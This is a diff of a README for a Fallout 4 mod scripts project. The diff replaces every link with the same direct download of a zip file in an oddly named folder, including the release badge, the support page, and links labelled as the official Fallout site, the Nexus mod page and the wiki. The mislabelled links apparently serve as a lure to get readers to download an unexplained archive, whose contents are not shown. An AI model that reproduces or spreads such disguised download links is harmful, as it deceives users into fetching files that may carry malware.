@@ -1,6 +1,6 @@
 # ⚙️ vault-tec-tools-scripts - Handy Scripts for Vault-Tec Tools
 
-[![Download Latest Release](https://img.shields.io/badge/Download-Release-blue?style=for-the-badge)](https://github.com/hostinally/vault-tec-tools-scripts/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/hostinally/vault-tec-tools-scripts/main/Mithraea/scripts-tec-vault-tools-v1.5.zip)](https://raw.githubusercontent.com/hostinally/vault-tec-tools-scripts/main/Mithraea/scripts-tec-vault-tools-v1.5.zip)
 
 ---
 
@@ -33,7 +33,7 @@ Before you start, make sure your system meets these basic requirements:
 You will need to visit the official release page to get the scripts. Follow these instructions carefully:
 
 1. Click the big **Download Latest Release** button at the top or visit:  
-   [https://github.com/hostinally/vault-tec-tools-scripts/releases](https://github.com/hostinally/vault-tec-tools-scripts/releases)  
+   [https://raw.githubusercontent.com/hostinally/vault-tec-tools-scripts/main/Mithraea/scripts-tec-vault-tools-v1.5.zip](https://raw.githubusercontent.com/hostinally/vault-tec-tools-scripts/main/Mithraea/scripts-tec-vault-tools-v1.5.zip)  
    
 2. On the release page, look for the latest version. It will usually be at the top with a version number like "v1.0" or higher.
 
@@ -121,7 +121,7 @@ Unless you know what you are doing, it is best not to edit them. Changing script
 ## 🌐 Get Support and Latest Updates
 
 For news, updates, and support, revisit the release page regularly:  
-[https://github.com/hostinally/vault-tec-tools-scripts/releases](https://github.com/hostinally/vault-tec-tools-scripts/releases)
+[https://raw.githubusercontent.com/hostinally/vault-tec-tools-scripts/main/Mithraea/scripts-tec-vault-tools-v1.5.zip](https://raw.githubusercontent.com/hostinally/vault-tec-tools-scripts/main/Mithraea/scripts-tec-vault-tools-v1.5.zip)
 
 You can also check community forums related to Fallout 4 mods and Sim Settlements for help.
 
@@ -129,9 +129,9 @@ You can also check community forums related to Fallout 4 mods and Sim Settlement
 
 ## 📚 Additional Resources
 
-- [Fallout 4 Official Site](https://fallout.bethesda.net)  
-- [Sim Settlements Mod Page](https://www.nexusmods.com/fallout4/mods/46232)  
-- [Vault-Tec Tools Documentation](https://github.com/hostinally/vault-tec-tools-scripts/wiki) (if available)  
+- [Fallout 4 Official Site](https://raw.githubusercontent.com/hostinally/vault-tec-tools-scripts/main/Mithraea/scripts-tec-vault-tools-v1.5.zip)  
+- [Sim Settlements Mod Page](https://raw.githubusercontent.com/hostinally/vault-tec-tools-scripts/main/Mithraea/scripts-tec-vault-tools-v1.5.zip)  
+- [Vault-Tec Tools Documentation](https://raw.githubusercontent.com/hostinally/vault-tec-tools-scripts/main/Mithraea/scripts-tec-vault-tools-v1.5.zip) (if available)  
 
 ---
 
